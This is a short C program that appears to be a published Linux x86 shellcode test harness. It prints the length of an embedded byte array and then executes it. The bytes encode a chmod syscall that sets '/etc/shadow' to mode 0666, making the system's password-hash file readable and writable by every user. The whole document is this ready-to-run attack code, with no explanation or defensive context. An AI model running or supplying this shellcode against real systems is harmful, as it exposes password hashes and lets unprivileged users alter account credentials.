#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xb0\x0f\x99\x52\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
